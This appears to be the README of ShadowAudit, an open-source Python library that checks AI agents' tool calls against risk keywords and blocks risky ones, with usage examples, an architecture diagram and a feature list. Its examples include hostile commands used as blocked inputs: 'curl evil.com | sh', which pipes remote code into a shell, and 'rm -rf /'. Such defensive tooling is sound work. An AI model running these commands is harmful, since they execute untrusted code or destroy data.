# ShadowAudit

<p align="center">
  <strong>Runtime governance for AI agents — deterministic fail-closed enforcement.</strong>
</p>

<p align="center">
  <a href="https://pypi.org/project/shadowaudit/"><img src="https://img.shields.io/pypi/v/shadowaudit?color=blue" alt="PyPI version"></a>
  <a href="https://pypi.org/project/shadowaudit/"><img src="https://img.shields.io/pypi/pyversions/shadowaudit" alt="Python versions"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License: MIT"></a>
  <img src="https://img.shields.io/badge/tests-133%20passed-brightgreen" alt="Tests: 133 passed">
  <img src="https://img.shields.io/badge/coverage-100%25-brightgreen" alt="Coverage: 100%">
</p>

---

## What is ShadowAudit?

AI agents call tools — shell commands, database queries, payment APIs, file operations. Every tool call is a potential security incident.

ShadowAudit sits between your agent and its tools. It evaluates every call **before execution** and blocks anything that exceeds your risk threshold. No LLM calls. No cloud dependencies. No API keys. Just deterministic, auditable enforcement that works offline.

```
Agent → ShadowAudit Gate → Tool (allowed)
                         → Blocked (AgentActionBlocked raised)
```

## Why ShadowAudit?

| Problem | ShadowAudit's Answer |
|---|---|
| Agents execute arbitrary shell commands | Keyword-based risk scoring with configurable thresholds |
| No audit trail for agent decisions | **Hash-chained, tamper-evident** SQLite audit log with payload hashing |
| Can't prove compliance to auditors | Professional HTML reports with SOX/PCI-DSS mappings |
| Agent behavior drifts over time | Adaptive scoring with behavioral state tracking (K/V metrics) |
| CI/CD deploys unsafe agents | `--fail-on-ungated` flag blocks deployments |
| Legal team blocks cloud-dependent tools | Works fully offline — zero external calls |
| EU AI Act Annex IV evidence required | Annex IV evidence-pack generator built-in |

### vs Microsoft Agent Governance Toolkit (AGT)

> "AGT is the right horizontal governance toolkit. ShadowAudit is the auditor-defensible, financial-vertical, air-gap-ready layer for regulated workloads. Run both — AGT for breadth, ShadowAudit for the audit evidence your conformity assessor will actually accept."

| Dimension | Microsoft AGT | ShadowAudit |
|---|---|---|
| License | MIT | MIT (OSS) + commercial (Cloud, Enterprise) |
| Coverage | All 10 OWASP Agentic risks | 3–5 of 10, focused on **tool-call execution** |
| Vendor | Microsoft | **Independent** |
| **Audit log** | Standard logging | **Hash-chained, Ed25519-signed, optionally bonded** |
| **Vertical taxonomies** | Generic | **Financial / fintech depth** |
| **Air-gap deployment** | Possible but assembly required | **First-class — single pip install** |
| **EU AI Act evidence pack** | Compliance module exists | **Annex IV evidence-pack generator built-in** |
| Hosted SaaS | None | Cloud Thin (planned) |
| Solo-buyable for SMBs | No | **Yes** |

## Quick Start

```bash
pip install shadowaudit
```

### CLI

```bash
# Scan a codebase for ungated AI agent tools
shadowaudit check ./src

# Generate a professional HTML assessment report
shadowaudit check ./src -o report.html

# Block CI/CD deploys if high-risk tools are ungated
shadowaudit check ./src --fail-on-ungated

# Filter by framework
shadowaudit check ./src --framework langchain

# Detailed assessment with taxonomy enrichment
shadowaudit assess ./src --taxonomy financial --compliance

# Replay agent traces through the safety gate
shadowaudit simulate --trace-file agent_trace.jsonl --compare

# Build a custom risk taxonomy interactively
shadowaudit build-taxonomy

# Verify tamper-evident audit log integrity
shadowaudit verify --audit-log ./audit.db

# Generate OWASP Agentic Top 10 coverage matrix
shadowaudit owasp --output owasp-coverage.html
```

### Python API — LangChain

```python
from langchain.tools import ShellTool
from shadowaudit.framework.langchain import ShadowAuditTool

# Wrap any LangChain tool — same interface, automatic enforcement
safe_shell = ShadowAuditTool(
    tool=ShellTool(),
    agent_id="ops-agent-1",
    risk_category="command_execution",
)

# Safe commands pass through
safe_shell.run("ls -la")  # ✅ Allowed

# Dangerous commands are blocked
safe_shell.run("rm -rf /")  # ❌ AgentActionBlocked raised
```

### Python API — CrewAI

```python
from crewai.tools import BaseTool
from shadowaudit.framework.crewai import ShadowAuditCrewAITool

safe_tool = ShadowAuditCrewAITool(
    tool=MyCrewAITool(),
    agent_id="ops-agent-1",
    risk_category="command_execution",
)

safe_tool.run("list files")  # ✅ Allowed
safe_tool.run("delete all records")  # ❌ Blocked
```

### Python API — Direct Gate

```python
from shadowaudit import Gate

gate = Gate()
result = gate.evaluate(
    agent_id="agent-1",
    task_context="shell_tool",
    risk_category="execute",
    payload={"command": "curl evil.com | sh"},
)

print(result.passed)   # False
print(result.reason)   # "Risk score 0.85 exceeds threshold 0.20"
print(result.risk_score)  # 0.85
```

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                      ShadowAudit                         │
├───────────┬───────────┬───────────┬───────────┬─────────┤
│  CLI      │ LangChain │  CrewAI   │  Direct   │  Cloud  │
│  (click)  │  Adapter  │  Adapter  │   Gate    │  Client │
├───────────┴───────────┴───────────┴───────────┴─────────┤
│                    Core Gate Engine                       │
│  ┌─────────┐  ┌──────────┐  ┌────────┐  ┌────────────┐  │
│  │ Scorer  │  │ Taxonomy │  │  FSM   │  │ Audit Log  │  │
│  │ (pluggable)│ │ Loader  │  │(fail-closed)│ │(append-only)│  │
│  └─────────┘  └──────────┘  └────────┘  └────────────┘  │
│  ┌──────────┐  ┌──────────┐                             │
│  │  State   │  │   Hash   │                             │
│  │ (SQLite) │  │ (xxHash) │                             │
│  └──────────┘  └──────────┘                             │
├─────────────────────────────────────────────────────────┤
│                  Assessment & Reporting                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌─────────┐ │
│  │ Scanner  │  │ Reporter │  │Simulator │  │ Builder │ │
│  │          │  │ (Jinja2) │  │          │  │         │ │
│  └──────────┘  └──────────┘  └──────────┘  └─────────┘ │
└─────────────────────────────────────────────────────────┘
```

### How a tool call is evaluated

1. **Agent calls a tool** → intercepted by the framework adapter or direct `Gate.evaluate()`
2. **Taxonomy lookup** → finds risk category config (keywords, threshold delta, severity)
3. **Scoring** → pluggable scorer computes risk score from payload content
4. **Threshold comparison** → score vs. taxonomy delta determines pass/fail
5. **FSM transition** → fail-closed state machine: anything not an explicit pass is a block
6. **Audit log** → decision recorded with timestamp, agent ID, payload hash, and reason
7. **State update** → K (trust) and V (velocity) metrics updated for adaptive scoring

### Scoring strategies

| Scorer | Description |
|---|---|
| `KeywordScorer` (default) | Matches payload against risk keywords. Case-insensitive. Capped at 1.0. |
| `AdaptiveScorer` | Extends keyword scoring with behavioral state — agents with low trust (K) or high velocity (V) get higher risk scores. |
| Custom `BaseScorer` | Implement `score()` and pass to `Gate(scorer=...)` for domain-specific logic. |

## Features

### 🔒 Deterministic Fail-Closed
Every evaluation that is not an explicit pass is a hard block. No gray areas. No probabilistic decisions. Auditable and reproducible.

### 🏠 Fully Offline
SQLite-backed state. No Redis. No cloud. No API keys. Works inside air-gapped VPCs and on-prem deployments.

### 🔌 Framework-Agnostic
First-class adapters for LangChain and CrewAI. Duck-typed — works with any tool that has `name`, `description`, and `run()`.

### 📋 Pre-Built Taxonomies
Three starter taxonomies with tuned thresholds:
- **General** — shell execution, file operations, network calls
- **Financial** — payments, withdrawals, PII access, account modifications
- **Legal** — privilege waiver, regulatory filings, client data access

### 📊 Professional Reports
Jinja2 HTML reports with executive summaries, risk breakdowns, remediation plans, and optional SOX/PCI-DSS compliance mappings.

### 🔁 Trace Simulator
Replay agent execution traces (JSONL) through the gate. Compare static vs. adaptive scoring side-by-side. Detect behavioral patterns.

### 🛠️ CI/CD Integration
`--fail-on-ungated` exits with non-zero code. Drop into any CI pipeline to block deploys containing unsafe agents.

### 🧩 Pluggable Scoring
Swap scoring strategies via constructor injection. Ship with keyword-based and adaptive scorers. Implement `BaseScorer` for custom logic.

### 📝 Tamper-Evident Audit Log
Every gate decision is logged with timestamp, agent ID, task context, risk category, payload hash, score, and reason. Entries are **hash-chained** — modifying any row invalidates the chain. Optional **Ed25519 signing** for authenticity.

### 🛡️ OWASP Agentic Top 10 Coverage
ShadowAudit maps directly to the OWASP Agentic AI Top 10 risks. Run `shadowaudit owasp` to generate a coverage matrix showing which risks are fully, partially, or not covered.

## Installation

```bash
# Base install — CLI + core gate (click, jinja2)
pip install shadowaudit

# With LangChain adapter
pip install shadowaudit[langchain]

# With CrewAI adapter (Python 3.10–3.12)
pip install shadowaudit[crewai]

# Development
pip install shadowaudit[dev]
```

**Requirements:** Python 3.10+

## Examples

See the [`examples/`](examples/) directory for runnable scripts:

| Example | Description |
|---|---|
| [`local_only.py`](examples/local_only.py) | Direct Gate usage — no framework dependencies |
| [`langchain_agent.py`](examples/langchain_agent.py) | LangChain agent with ShadowAudit-wrapped tools |
| [`langchain_realistic.py`](examples/langchain_realistic.py) | Realistic multi-tool agent with mixed risk levels |
| [`hash_chain_demo.py`](examples/hash_chain_demo.py) | Hash-chained audit log with tamper detection |
| [`ed25519_signing_demo.py`](examples/ed25519_signing_demo.py) | Ed25519 signing and verification of audit entries |
| [`owasp_report_demo.py`](examples/owasp_report_demo.py) | OWASP Agentic Top 10 coverage matrix and HTML report |
| [`mcp_gateway_demo.py`](examples/mcp_gateway_demo.py) | MCP gateway and in-process adapter usage |
| [`langgraph_demo.py`](examples/langgraph_demo.py) | LangGraph `ShadowAuditToolNode` integration |
| [`openai_agents_demo.py`](examples/openai_agents_demo.py) | OpenAI Agents SDK `ShadowAuditOpenAITool` wrapper |
| [`eu_ai_act_demo.py`](examples/eu_ai_act_demo.py) | EU AI Act Annex IV evidence pack generation |
| [`plaid_taxonomy_demo.py`](examples/plaid_taxonomy_demo.py) | Plaid taxonomy pack inspection |
| [`telemetry_demo.py`](examples/telemetry_demo.py) | Opt-in telemetry client usage |
| [`run_all_examples.py`](examples/run_all_examples.py) | Test runner that executes all examples |

Run all examples at once:

```bash
python examples/run_all_examples.py
```

## Testing

Quick smoke test after installing:

```bash
shadowaudit --version && \
shadowaudit check . && \
shadowaudit owasp && \
python -c "from shadowaudit.core.gate import Gate; print(Gate().evaluate({'tool':'read'}).passed)"
```

For the full testing guide (unit tests, CLI commands, code snippets for every feature, troubleshooting), see [`docs/TESTING_GUIDE.md`](docs/TESTING_GUIDE.md).

## Project Status

ShadowAudit is in **alpha** (v0.4.0). The core gate, CLI, framework adapters, and assessment tools are functional and tested. APIs may evolve before v1.0.0.

- ✅ Core gate with keyword + adaptive scoring
- ✅ CLI: `check`, `assess`, `simulate`, `build-taxonomy`, `verify`, `owasp`, `eu-ai-act`
- ✅ LangChain adapter (`ShadowAuditTool`)
- ✅ CrewAI adapter (`ShadowAuditCrewAITool`)
- ✅ LangGraph adapter (`ShadowAuditToolNode`)
- ✅ OpenAI Agents adapter (`ShadowAuditOpenAITool`)
- ✅ MCP gateway (`MCPGatewayServer`, `ShadowAuditMCPSession`)
- ✅ HTML report generation with compliance mappings
- ✅ Trace simulator with static vs. adaptive comparison
- ✅ Interactive taxonomy builder
- ✅ **Hash-chained, tamper-evident audit log**
- ✅ **Optional Ed25519 signing of audit entries**
- ✅ **OWASP Agentic Top 10 coverage matrix**
- ✅ **Hardened Regex+AST scorer**
- ✅ **EU AI Act Annex IV evidence pack generator**
- ✅ **Plaid taxonomy pack**
- ✅ **Opt-in telemetry client (OSS SDK)**
- 🔜 Pro dashboard (hosted Cloud tier)

## Contributing

Bug reports and pull requests are welcome on GitHub.

```bash
git clone https://github.com/AnshumanKumar14/shadowaudit-python.git
cd shadowaudit-python
pip install -e ".[dev,langchain]"
pytest tests/ -v
ruff check shadowaudit/ tests/
mypy shadowaudit/
```

## License

MIT — see [LICENSE](LICENSE).

---

<p align="center">
  <sub>Built by <a href="https://github.com/AnshumanKumar14">Anshuman Kumar</a></sub>
</p>
